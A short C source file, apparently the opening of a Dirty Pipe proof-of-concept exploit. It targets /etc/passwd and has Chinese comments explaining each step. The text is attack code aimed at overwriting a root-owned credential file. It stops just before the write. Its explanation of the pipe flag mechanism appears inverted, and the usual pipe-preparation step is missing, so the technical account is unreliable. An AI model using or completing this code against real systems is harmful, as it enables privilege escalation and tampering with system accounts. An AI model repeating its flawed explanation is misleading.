// 运行: ./dirty_pipe_poc
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    // 打开目标文件（必须可读）
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 创建管道
    int p[2];
    if (pipe(p) == -1) {
        perror("pipe");
        return 1;
    }

    // 使用splice将文件内容映射到管道写端
    // splice(fd, NULL, p[1], NULL, 1, 0) 将文件第一个字节映射到管道
    // 注意：需要映射至少一个字节，且后续写入会覆盖该字节所在的页
    ssize_t n = splice(fd, NULL, p[1], NULL, 1, 0);
    if (n <= 0) {
        perror("splice");
        return 1;
    }

    // 现在管道写端有一个缓冲区，其flags未设置CAN_MERGE
    // 向管道写入数据，会覆盖文件页缓存
